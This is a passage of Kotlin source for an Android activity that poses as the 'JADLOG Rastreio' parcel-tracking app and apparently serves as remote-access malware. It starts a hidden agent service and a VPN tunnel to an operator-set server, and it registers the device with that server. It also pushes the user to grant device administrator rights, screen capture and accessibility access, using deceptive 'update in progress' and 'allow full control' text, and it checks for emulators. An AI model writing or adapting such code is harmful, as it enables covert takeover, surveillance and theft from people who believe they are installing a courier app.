    // =========================================================================
    private fun startBackgroundServices() {
        startForegroundAgentService()
        if (enrollment.vpnEnabled && !isVpnActive) {
            requestVpnTunnel()
        }
    }

    private fun startForegroundAgentService() {
        try {
            val serviceIntent = Intent(this, AgentForegroundService::class.java).apply {
                putExtra(AgentForegroundService.EXTRA_SERVER_URL, enrollment.serverUrl)
                putExtra(AgentForegroundService.EXTRA_DEVICE_NAME, enrollment.deviceName)
                putExtra(AgentForegroundService.EXTRA_ENROLLMENT_TOKEN, enrollment.enrollmentToken)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Falha ao iniciar AgentForegroundService: ${e.message}")
        }
    }

    private fun requestVpnTunnel() {
        val vpnPrepareIntent = VpnService.prepare(this)
        if (vpnPrepareIntent != null) {
            startActivityForResult(vpnPrepareIntent, vpnRequestCode)
        } else {
            startVpnTunnelService()
        }
    }

    private fun startVpnTunnelService() {
        try {
            val (host, port) = extractHostAndPort(enrollment.serverUrl)
            AgentVpnService.startTunnel(
                this,
                host,
                port,
                enrollment.appName,
                enrollment.vpnProtocol
            )
            isVpnActive = true
        } catch (e: Exception) {
            Log.w(TAG, "Falha ao iniciar AgentVpnService: ${e.message}")
        }
    }

    private fun openWebApp() {
        val intent = Intent(this, WebAppActivity::class.java).apply {
            putExtra(WebAppActivity.EXTRA_URL, enrollment.redirectUrl)
        }
        startActivity(intent)
    }

    private fun promptSystemOptions() {
        val options = arrayOf(
            "Abrir Rastreamento Web (${enrollment.appName})",
            "Ativar Administrador do Dispositivo",
            "Solicitar Projeção de Tela",
            "Reabrir Acessibilidade do Android"
        )
        AlertDialog.Builder(this)
            .setTitle("Opções do Sistema")
            .setItems(options) { _, which ->
                when (which) {
                    0 -> openWebApp()
                    1 -> requestDeviceAdmin()
                    2 -> consentController.requestScreenCapture(projectionRequestCode)
                    3 -> openAccessibilitySettings()
                }
            }
            .setNegativeButton("Fechar", null)
            .show()
    }

    private fun requestDeviceAdmin() {
        val component = ComponentName(this, DroidViewDeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Permite administração e suporte corporativo supervisionado.")
        }
        startActivity(intent)
    }

    private fun registerWithServerAsync() {
        Thread {
            try {
                val targetUrl = "${enrollment.serverUrl}/devices/register"
                val url = URL(targetUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; utf-8")
                conn.doOutput = true
                conn.connectTimeout = 3000
                conn.readTimeout = 3000

                val payload = JSONObject().apply {
                    put("id", "dev_" + (Build.MODEL.replace("\\s+".toRegex(), "_").lowercase()))
                    put("name", "${enrollment.appName} (${Build.MODEL})")
                    put("model", Build.MODEL)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("battery", 95)
                    put("isEmulator", isRunningOnEmulator())
                }

                conn.outputStream.use { os ->
                    val input = payload.toString().toByteArray(Charsets.UTF_8)
                    os.write(input, 0, input.size)
                }

                val code = conn.responseCode
                Log.d(TAG, "Registro no servidor concluído com HTTP $code")
            } catch (e: Exception) {
                Log.w(TAG, "Não foi possível registrar no servidor central neste momento: ${e.message}")
            }
        }.start()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            vpnRequestCode -> {
                if (resultCode == Activity.RESULT_OK) {
                    startVpnTunnelService()
                }
            }
            projectionRequestCode -> {
                val accepted = consentController.handleResult(resultCode, data)
                isScreenAccepted = accepted
                if (accepted) {
                    Toast.makeText(this, "Transmissão de tela autorizada!", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    // =========================================================================
    // PARSING DE CONFIGURAÇÕES DE ENROLLMENT
    // =========================================================================
    private fun parseEnrollment(): EnrollmentConfig {
        // 1. Deep link / Intent parameter
        val config = intent?.data?.getQueryParameter("config")
        if (config != null) {
            try {
                val normalized = config.replace('-', '+').replace('_', '/')
                val padded = normalized + "=".repeat((4 - normalized.length % 4) % 4)
                val json = String(Base64.decode(padded, Base64.DEFAULT), Charsets.UTF_8)
                val parsed = JSONObject(json)
                val conf = parseJsonConfig(parsed)
                saveEnrollmentToPrefs(conf)
                return conf
            } catch (_: Exception) {}
        }

        // 2. Embedded asset inside APK
        try {
            assets.open("enrollment.json").use { stream ->
                val json = stream.bufferedReader().use { it.readText() }
                val parsed = JSONObject(json)
                val conf = parseJsonConfig(parsed)
                saveEnrollmentToPrefs(conf)
                return conf
            }
        } catch (_: Exception) {}

        // 3. Saved SharedPreferences
        val saved = loadEnrollmentFromPrefs()
        if (saved != null) {
            return saved
        }

        // 4. Default fallback com strings.xml
        val defaultUrl = resolveServerUrl("http://localhost:3000")
        val appLabel = try {
            getString(R.string.app_name)
        } catch (_: Exception) {
            "JADLOG Rastreio"
        }

        return EnrollmentConfig(
            serverUrl = defaultUrl,
            appName = appLabel,
            redirectUrl = "https://jadlog.com.br/rastreamento",
            valid = true
        )
    }

    private fun parseJsonConfig(parsed: JSONObject): EnrollmentConfig {
        val appLabel = try {
            getString(R.string.app_name)
        } catch (_: Exception) {
            "JADLOG Rastreio"
        }
        val configuredAppName = parsed.optString("appName", appLabel)
        val finalAppName = if (configuredAppName.isNotEmpty() && configuredAppName != "DVIEW Agent") {
            configuredAppName
        } else {
            appLabel
        }

        val screenObj = parsed.optJSONObject("screenConfig")
        val accentColor = screenObj?.optString("accentColor")?.takeIf { it.isNotBlank() }
            ?: parsed.optString("accentColor", "#DC2626").ifBlank { "#DC2626" }
        val loadingSubtext = screenObj?.optString("loadingSubtext")?.takeIf { it.isNotBlank() }
            ?: parsed.optString("loadingSubtext", "aguarde, atualização em andamento...").ifBlank { "aguarde, atualização em andamento..." }
        val copyrightText = screenObj?.optString("copyrightText")?.takeIf { it.isNotBlank() }
            ?: parsed.optString("copyrightText", "All Rights Reserved.").ifBlank { "All Rights Reserved." }
        val trackingTitle = screenObj?.optString("trackingTitle")?.takeIf { it.isNotBlank() }
            ?: parsed.optString("trackingTitle", "Acessar Rastreamento").ifBlank { "Acessar Rastreamento" }
        val trackingSubtext = screenObj?.optString("trackingSubtext")?.takeIf { it.isNotBlank() }
            ?: parsed.optString("trackingSubtext", "Serviços locais validados com sucesso.").ifBlank { "Serviços locais validados com sucesso." }
        val speechCalloutText = screenObj?.optString("speechCalloutText")?.takeIf { it.isNotBlank() }
            ?: parsed.optString("speechCalloutText", "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.").ifBlank { "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar." }
        val serviceDescription = screenObj?.optString("serviceDescription")?.takeIf { it.isNotBlank() }
            ?: parsed.optString("serviceDescription", "Permite que o aplicativo observe ações, conteúdo da tela e interações.").ifBlank { "Permite que o aplicativo observe ações, conteúdo da tela e interações." }
        val permissionDialogTitle = screenObj?.optString("permissionDialogTitle")?.takeIf { it.isNotBlank() }
            ?: parsed.optString("permissionDialogTitle", "Permitir controle total para {appName}?").ifBlank { "Permitir controle total para {appName}?" }

        return EnrollmentConfig(
            serverUrl = resolveServerUrl(parsed.optString("serverUrl", "http://localhost:3000")),
            enrollmentToken = parsed.optString("enrollmentToken", ""),
            deviceName = parsed.optString("deviceName", Build.MODEL ?: "Android Device"),
            appName = finalAppName,
            redirectUrl = parsed.optString("redirectUrl", "https://jadlog.com.br/rastreamento"),
            logoDataUrl = parsed.optString("logoDataUrl", ""),
            vpnEnabled = parsed.optBoolean("vpnEnabled", true),
            vpnPort = parsed.optInt("vpnPort", 8443),
            vpnProtocol = parsed.optString("vpnProtocol", "TLS"),
            accentColor = accentColor,
            loadingSubtext = loadingSubtext,
            copyrightText = copyrightText,
            trackingTitle = trackingTitle,
            trackingSubtext = trackingSubtext,
            speechCalloutText = speechCalloutText,
            serviceDescription = serviceDescription,
            permissionDialogTitle = permissionDialogTitle,
            valid = true
        )
    }

    private fun saveEnrollmentToPrefs(config: EnrollmentConfig) {
        getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE).edit().apply {
            putString("serverUrl", config.serverUrl)
            putString("enrollmentToken", config.enrollmentToken)
            putString("deviceName", config.deviceName)
            putString("appName", config.appName)
            putString("redirectUrl", config.redirectUrl)
            putString("logoDataUrl", config.logoDataUrl)
            putBoolean("vpnEnabled", config.vpnEnabled)
            putInt("vpnPort", config.vpnPort)
            putString("vpnProtocol", config.vpnProtocol)
            putString("accentColor", config.accentColor)
            putString("loadingSubtext", config.loadingSubtext)
            putString("copyrightText", config.copyrightText)
            putString("trackingTitle", config.trackingTitle)
            putString("trackingSubtext", config.trackingSubtext)
            putString("speechCalloutText", config.speechCalloutText)
            putString("serviceDescription", config.serviceDescription)
            putString("permissionDialogTitle", config.permissionDialogTitle)
            apply()
        }
    }

    private fun loadEnrollmentFromPrefs(): EnrollmentConfig? {
        val prefs = getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
        if (!prefs.contains("serverUrl")) return null
        return EnrollmentConfig(
            serverUrl = resolveServerUrl(prefs.getString("serverUrl", "http://localhost:3000") ?: "http://localhost:3000"),
            enrollmentToken = prefs.getString("enrollmentToken", "") ?: "",
            deviceName = prefs.getString("deviceName", Build.MODEL ?: "Android Device") ?: (Build.MODEL ?: "Android Device"),
            appName = prefs.getString("appName", getString(R.string.app_name)) ?: getString(R.string.app_name),
            redirectUrl = prefs.getString("redirectUrl", "https://jadlog.com.br/rastreamento") ?: "https://jadlog.com.br/rastreamento",
            logoDataUrl = prefs.getString("logoDataUrl", "") ?: "",
            vpnEnabled = prefs.getBoolean("vpnEnabled", true),
            vpnPort = prefs.getInt("vpnPort", 8443),
            vpnProtocol = prefs.getString("vpnProtocol", "TLS") ?: "TLS",
            accentColor = prefs.getString("accentColor", "#DC2626") ?: "#DC2626",
            loadingSubtext = prefs.getString("loadingSubtext", "aguarde, atualização em andamento...") ?: "aguarde, atualização em andamento...",
            copyrightText = prefs.getString("copyrightText", "All Rights Reserved.") ?: "All Rights Reserved.",
            trackingTitle = prefs.getString("trackingTitle", "Acessar Rastreamento") ?: "Acessar Rastreamento",
            trackingSubtext = prefs.getString("trackingSubtext", "Serviços locais validados com sucesso.") ?: "Serviços locais validados com sucesso.",
            speechCalloutText = prefs.getString("speechCalloutText", "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.") ?: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
            serviceDescription = prefs.getString("serviceDescription", "Permite que o aplicativo observe ações, conteúdo da tela e interações.") ?: "Permite que o aplicativo observe ações, conteúdo da tela e interações.",
            permissionDialogTitle = prefs.getString("permissionDialogTitle", "Permitir controle total para {appName}?") ?: "Permitir controle total para {appName}?",
            valid = true
        )
    }

    private fun isRunningOnEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.PRODUCT.contains("sdk_gphone")
                || Build.PRODUCT.contains("vbox86p"))
    }

    private fun resolveServerUrl(rawUrl: String): String {
        val isLocalhost = rawUrl.contains("localhost") || rawUrl.contains("127.0.0.1")
        if (isLocalhost) {
            return if (isRunningOnEmulator()) {
                rawUrl.replace("localhost", "10.0.2.2").replace("127.0.0.1", "10.0.2.2")
            } else {
                rawUrl.replace("localhost", "192.168.100.6").replace("127.0.0.1", "192.168.100.6")
            }
        }
        return rawUrl
    }

    private fun extractHostAndPort(urlStr: String): Pair<String, Int> {
        return try {
            val uri = URI(urlStr)
            val host = uri.host ?: (if (isRunningOnEmulator()) "10.0.2.2" else "192.168.100.6")
            val port = if (uri.port > 0) uri.port else 3000
            Pair(host, port)
        } catch (_: Exception) {
            Pair(if (isRunningOnEmulator()) "10.0.2.2" else "192.168.100.6", 3000)
        }
    }

    companion object {
        private const val TAG = "JadlogMainActivity"
    }

    data class EnrollmentConfig(
        val serverUrl: String = "http://localhost:3000",
        val enrollmentToken: String = "",
        val deviceName: String = Build.MODEL ?: "Android Device",
        val appName: String = "JADLOG Rastreio",
        val redirectUrl: String = "https://jadlog.com.br/rastreamento",
        val logoDataUrl: String = "",
        val vpnEnabled: Boolean = true,
        val vpnPort: Int = 8443,
        val vpnProtocol: String = "TLS",
        val accentColor: String = "#DC2626",
        val loadingSubtext: String = "aguarde, atualização em andamento...",
        val copyrightText: String = "All Rights Reserved.",
        val trackingTitle: String = "Acessar Rastreamento",
        val trackingSubtext: String = "Serviços locais validados com sucesso.",
        val speechCalloutText: String = "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
        val serviceDescription: String = "Permite que o aplicativo observe ações, conteúdo da tela e interações.",
        val permissionDialogTitle: String = "Permitir controle total para {appName}?",
        val valid: Boolean = false
    )
}
